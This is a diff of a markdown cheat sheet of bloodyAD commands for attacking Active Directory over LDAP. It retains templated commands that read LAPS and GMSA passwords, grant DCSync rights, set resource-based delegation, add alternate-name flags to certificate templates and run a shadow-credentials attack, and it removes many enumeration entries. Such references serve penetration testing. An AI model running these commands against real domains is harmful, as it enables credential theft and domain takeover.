 
 ## LAPS Password Retrieval
 
@@ -446,7 +778,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get search 
 
 Read LAPS password from a computer object.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get object '<computer_name>$' --attr ms-Mcs-AdmPwd
 ```
 
@@ -456,20 +788,8 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get object 
 
 Read GMSA password from a managed service account.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get object '<gmsa_name>$' --attr msDS-ManagedPassword
-```
-
-## Machine Account Quota Management
-
-## Check Machine Account Quota
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION
-
-Check the Machine Account Quota (MAQ) setting.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get object '<DC=dc,DC=dc>' --attr ms-DS-MachineAccountQuota
 ```
 
 ## Set Machine Account Quota
@@ -478,11 +798,9 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get object 
 
 Set the Machine Account Quota (MAQ) value.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object '<DC=dc,DC=dc>' ms-DS-MachineAccountQuota -v <value>
 ```
-
-## MSLDAP Commands (Experimental)
 
 ## MSLDAP add_genericwrite
 
@@ -492,7 +810,7 @@ Add genericWrite right on a target.
 target_dn: CN=target_object,CN=Users,DC=domain,DC=com
 user_dn: CN=target_user,CN=Users,DC=domain,DC=com
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap add_genericwrite <target_dn> <user_dn>
 ```
 
@@ -502,7 +820,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap add_
 
 Add a SID to the msDS-AllowedToActOnBehalfOfOtherIdentity property.
 target_dn: CN=target_object,CN=Users,DC=domain,DC=com
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addallowedtoactonbehalfofotheridentity <target_dn> <other_identity_sid>
 ```
 
@@ -512,7 +830,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap adda
 
 Modify certificate template to enable ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME bit.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addcerttemplatenameflagaltname <cert_template_name>
 ```
 
@@ -522,7 +840,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addc
 
 Add a new computer account.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addcomputer
 ```
 
@@ -533,7 +851,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addc
 Grant enrollment rights to a user for a certificate template.
 user_dn: CN=target_user,CN=Users,DC=domain,DC=com
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addenrollmentright <cert_template_name> <user_dn>
 ```
 
@@ -544,7 +862,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap adde
 Add additional hostname to a computer account.
 user_dn: CN=target_user,CN=Users,DC=domain,DC=com
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addhostname <user_dn> <hostname>
 ```
 
@@ -556,7 +874,7 @@ Add AddMember rights to a user on a group.
 group_dn: CN=target_group,CN=Users,DC=domain,DC=com
 user_dn: CN=target_user,CN=Users,DC=domain,DC=com
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addprivaddmember <user_dn> <group_dn>
 ```
 
@@ -567,7 +885,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addp
 Add DCSync rights to a user.
 user_dn: CN=target_user,CN=Users,DC=domain,DC=com
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addprivdcsync <user_dn>
 ```
 
@@ -578,7 +896,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addp
 Add an SPN entry to a user account.
 user_dn: CN=target_user,CN=Users,DC=domain,DC=com
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addspn <user_dn> <spn>
 ```
 
@@ -589,7 +907,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap adds
 Create a new domain user with password.
 user_dn: CN=target_user,CN=Users,DC=domain,DC=com
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap adduser <user_dn> <password>
 ```
 
@@ -601,18 +919,8 @@ Add user to a specified group.
 group_dn: CN=target_group,CN=Users,DC=domain,DC=com
 user_dn: CN=target_user,CN=Users,DC=domain,DC=com
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap addusertogroup <user_dn> <group_dn>
-```
-
-## MSLDAP adinfo
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Print detailed Active Directory info.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap adinfo
 ```
 
 ## MSLDAP aiacas
@@ -621,28 +929,8 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap adin
 
 List AIA CA certificates.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap aiacas
-```
-
-## MSLDAP allschemaentry
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Fetch all schema object entry objects.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap allschemaentry
-```
-
-## MSLDAP asrep
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Fetch ASREP-roastable user accounts.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap asrep
 ```
 
 ## MSLDAP badsuccessor_check
@@ -651,7 +939,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap asre
 
 Check if BadSuccessor vulnerability is present on the domain.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap badsuccessor_check
 ```
 
@@ -661,7 +949,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap bads
 
 ADCA security test.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap certify
 ```
 
@@ -671,7 +959,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap cert
 
 ADCA security test - new version.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap certify2
 ```
 
@@ -681,7 +969,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap cert
 
 List certificate templates.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap certtemplates
 ```
 
@@ -691,7 +979,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap cert
 
 Change the owner in a Security Descriptor.
 target_dn: CN=target_object,CN=Users,DC=domain,DC=com
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap changeowner <new_owner_sid> <target_dn>
 ```
 
@@ -701,7 +989,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap chan
 
 Change the sAMAccountName of a given DN.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap changesamaccountname <dn> <newname>
 ```
 
@@ -712,28 +1000,8 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap chan
 Change user password.
 user_dn: CN=target_user,CN=Users,DC=domain,DC=com
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap changeuserpw <user_dn> <newpass>
-```
-
-## MSLDAP computeraddr
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Fetch all computer accounts.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap computeraddr
-```
-
-## MSLDAP constrained
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-List all constrained delegation objects.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap constrained
 ```
 
 ## MSLDAP create_broken_dmsa_user
@@ -743,18 +1011,8 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap cons
 Create a DMSA service user for potential exploitation.
 user_dn: CN=target_user,CN=Users,DC=domain,DC=com
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap create_broken_dmsa_user <user_dn> <computersid>
-```
-
-## MSLDAP dadms
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-List all members of the domain administrators group.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dadms
 ```
 
 ## MSLDAP delete
@@ -763,7 +1021,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dadm
 
 Remove an object identified by its DN.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap delete <dn>
 ```
 
@@ -774,7 +1032,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dele
 Remove an SPN entry from a user account.
 user_dn: CN=target_user,CN=Users,DC=domain,DC=com
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap delspn <user_dn> <spn>
 ```
 
@@ -785,7 +1043,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dels
 Delete a user.
 user_dn: CN=target_user,CN=Users,DC=domain,DC=com
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap deluser <user_dn>
 ```
 
@@ -797,7 +1055,7 @@ Remove user from a specified group.
 group_dn: CN=target_group,CN=Users,DC=domain,DC=com
 user_dn: CN=target_user,CN=Users,DC=domain,DC=com
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap deluserfromgroup <user_dn> <group_dn>
 ```
 
@@ -808,7 +1066,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap delu
 Disable a user account.
 user_dn: CN=target_user,CN=Users,DC=domain,DC=com
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap disableuser <user_dn>
 ```
 
@@ -818,18 +1076,8 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap disa
 
 Add a managed account preceded by link to a DMSA.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dmsaaddmanagedaccountprecededbylink <dn> <managedaccountprecededbylink>
-```
-
-## MSLDAP dmsas
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-List all delegated managed service accounts (DMSA).
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dmsas
 ```
 
 ## MSLDAP dmsasetdelegatedmsastate
@@ -838,28 +1086,8 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dmsa
 
 Set the delegated MSA state of a DMSA.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dmsasetdelegatedmsastate <dn> <delegatedmsastate>
-```
-
-## MSLDAP dn2sam
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Fetch the sAMAccountName of an object based on the DN.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dn2sam <dn>
-```
-
-## MSLDAP dn2sid
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Fetch the objectSid of an object based on the DN.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dn2sid <dn>
 ```
 
 ## MSLDAP dnsadd
@@ -868,7 +1096,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dn2s
 
 Add a DNS record for a given target.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsadd <target> <ip>
 ```
 
@@ -878,18 +1106,8 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsa
 
 Delete a DNS record for a given target.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsdelete <target>
-```
-
-## MSLDAP dnsdump
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Dump DNS records from Active Directory.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsdump
 ```
 
 ## MSLDAP dnsgetserial
@@ -898,7 +1116,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsd
 
 Get the serial number of a DNS record for a given zone.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsgetserial
 ```
 
@@ -908,7 +1126,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsg
 
 Modify a DNS record for a given target.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsmodify <target> <ip>
 ```
 
@@ -918,7 +1136,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsm
 
 Query a DNS record for a given target.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsquery <target>
 ```
 
@@ -928,7 +1146,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsq
 
 Query all DNS records for a given zone.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsqueryall
 ```
 
@@ -938,7 +1156,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsq
 
 Remove a DNS record for a given target (tombstones the record).
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsremove <target> <ip>
 ```
 
@@ -948,7 +1166,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsr
 
 Restore a DNS record for a given target.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsrestore <target>
 ```
 
@@ -958,7 +1176,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnsr
 
 Print the SOA record of a given zone.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnssoa
 ```
 
@@ -968,18 +1186,8 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnss
 
 List all DNS zones.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dnszones
-```
-
-## MSLDAP dump
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Fetch ALL user and machine accounts from the domain.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dump
 ```
 
 ## MSLDAP enableuser
@@ -989,7 +1197,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap dump
 Enable a user account.
 user_dn: CN=target_user,CN=Users,DC=domain,DC=com
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap enableuser <user_dn>
 ```
 
@@ -999,68 +1207,8 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap enab
 
 List enrollment services.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap enrollmentservices
-```
-
-## MSLDAP genschema
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Generate schema data (takes a long time).
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap genschema
-```
-
-## MSLDAP getsd
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Fetch security info for a given DN.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap getsd <dn>
-```
-
-## MSLDAP gmsa
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-List all managed service accounts (MSA) and retrieve passwords if possible.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap gmsa
-```
-
-## MSLDAP gpos
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Fetch Group Policy Objects.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap gpos
-```
-
-## MSLDAP groupmembers
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Return all member users in a group specified by DN.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap groupmembers <dn>
-```
-
-## MSLDAP groupmembership
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Fetch all groupnames the user is a member of for a given DN.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap groupmembership <dn>
 ```
 
 ## MSLDAP laps
@@ -1069,7 +1217,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap grou
 
 Fetch all LAPS passwords.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap laps
 ```
 
@@ -1079,28 +1227,8 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap laps
 
 Fetch LAPS password for a specific machine.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap lapstarget <machinesid>
-```
-
-## MSLDAP ldapinfo
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Print detailed LDAP connection info (DSA).
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap ldapinfo
-```
-
-## MSLDAP machine
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Fetch a machine object based on the sAMAccountName.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap machine <samaccountname>
 ```
 
 ## MSLDAP modify
@@ -1109,7 +1237,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap mach
 
 Modify an attribute of object.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap modify <dn> <attribute> <value>
 ```
 
@@ -1119,28 +1247,8 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap modi
 
 List NT CA certificates.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap ntcas
-```
-
-## MSLDAP pre2000
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-List potentially abusable machine accounts created with pre-Windows-2000 flag.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap pre2000
-```
-
-## MSLDAP query
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Perform a raw LDAP query.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap query <query>
 ```
 
 ## MSLDAP rootcas
@@ -1149,38 +1257,8 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap quer
 
 List Root CA certificates.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap rootcas
-```
-
-## MSLDAP s4u2proxy
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-List all S4U2Proxy objects.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap s4u2proxy
-```
-
-## MSLDAP sam2dn
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Fetch the DN of an object based on the sAMAccountName.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap sam2dn <sAMAccountName>
-```
-
-## MSLDAP schemaentry
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Fetch a schema object entry based on the DN.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap schemaentry <cn>
 ```
 
 ## MSLDAP setsd
@@ -1189,7 +1267,7 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap sche
 
 Update the security descriptor of an object.
 target_dn: CN=target_object,CN=Users,DC=domain,DC=com
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap setsd <target_dn> <sddl>
 ```
 
@@ -1199,68 +1277,8 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap sets
 
 Execute shadowcred attack.
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap shadowcred <targetuser>
-```
-
-## MSLDAP sid2dn
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Fetch the DN of an object based on the objectSid.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap sid2dn <sid>
-```
-
-## MSLDAP sidresolv
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Return the domain and username for a SID.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap sidresolv <sid>
-```
-
-## MSLDAP spns
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Fetch kerberoastable user accounts.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap spns
-```
-
-## MSLDAP tree
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Print a tree from the given DN with specified depth.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap tree
-```
-
-## MSLDAP trusts
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Fetch domain trusts.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap trusts
-```
-
-## MSLDAP unconstrained
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-List all unconstrained delegation objects.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap unconstrained
 ```
 
 ## MSLDAP unlockuser
@@ -1270,36 +1288,6 @@ bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap unco
 Unlock a user account by setting lockoutTime to 0.
 user_dn: CN=target_user,CN=Users,DC=domain,DC=com
 
-```bash
+```sh
 bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap unlockuser <user_dn>
-```
-
-## MSLDAP user
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Fetch a user object based on the sAMAccountName.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap user <samaccountname>
-```
-
-## MSLDAP whoami
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Full whoami information.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap whoami
-```
-
-## MSLDAP whoamiraw
-
-#platform/Windows #target/REMOTE #protocol/LDAP #cat/ENUMERATION #experimental
-
-Simple whoami information.
-
-```bash
-bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' msldap whoamiraw
 ```
